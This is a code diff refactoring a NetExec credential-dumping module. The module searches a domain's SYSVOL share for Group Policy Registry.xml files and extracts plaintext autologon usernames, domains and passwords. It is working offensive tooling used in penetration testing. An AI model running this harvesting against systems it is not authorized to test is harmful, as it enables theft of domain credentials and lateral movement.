@@ -15,45 +15,40 @@ class NXCModule:
     category = CATEGORY.CREDENTIAL_DUMPING
 
     def options(self, context, module_options):
-        """ """
+        """No options available."""
 
     def on_login(self, context, connection):
-        shares = connection.shares()
-        for share in shares:
-            if share["name"] == "SYSVOL" and "READ" in share["access"]:
-                context.log.success("Found SYSVOL share")
-                context.log.display("Searching for Registry.xml")
+        context.log.display("Searching SYSVOL share for Registry.xml")
 
-                paths = connection.spider("SYSVOL", pattern=["Registry.xml"])
+        paths = connection.spider("SYSVOL", pattern=["Registry.xml"])
+        for path in paths:
+            context.log.display(f"Found {path}")
 
-                for path in paths:
-                    context.log.display(f"Found {path}")
+            buf = BytesIO()
+            connection.conn.getFile("SYSVOL", path, buf.write)
+            xml = ET.fromstring(buf.getvalue())
 
-                    buf = BytesIO()
-                    connection.conn.getFile("SYSVOL", path, buf.write)
-                    xml = ET.fromstring(buf.getvalue())
+            if xml.findall('.//Properties[@name="DefaultPassword"]'):
+                usernames = []
+                passwords = []
+                domains = []
 
-                    if xml.findall('.//Properties[@name="DefaultPassword"]'):
-                        usernames = []
-                        passwords = []
-                        domains = []
+                xml_section = xml.findall(".//Properties")
 
-                        xml_section = xml.findall(".//Properties")
+                for section in xml_section:
+                    attrs = section.attrib
 
-                        for section in xml_section:
-                            attrs = section.attrib
+                    if attrs["name"] == "DefaultPassword":
+                        passwords.append(attrs["value"])
 
-                            if attrs["name"] == "DefaultPassword":
-                                passwords.append(attrs["value"])
+                    if attrs["name"] == "DefaultUserName":
+                        usernames.append(attrs["value"])
 
-                            if attrs["name"] == "DefaultUserName":
-                                usernames.append(attrs["value"])
+                    if attrs["name"] == "DefaultDomainName":
+                        domains.append(attrs["value"])
 
-                            if attrs["name"] == "DefaultDomainName":
-                                domains.append(attrs["value"])
-
-                        if usernames or passwords:
-                            context.log.success(f"Found credentials in {path}")
-                            context.log.highlight(f"Usernames: {usernames}")
-                            context.log.highlight(f"Domains: {domains}")
-                            context.log.highlight(f"Passwords: {passwords}")
+                if usernames or passwords:
+                    context.log.success(f"Found credentials in {path}")
+                    context.log.highlight(f"Usernames: {usernames}")
+                    context.log.highlight(f"Domains: {domains}")
+                    context.log.highlight(f"Passwords: {passwords}")
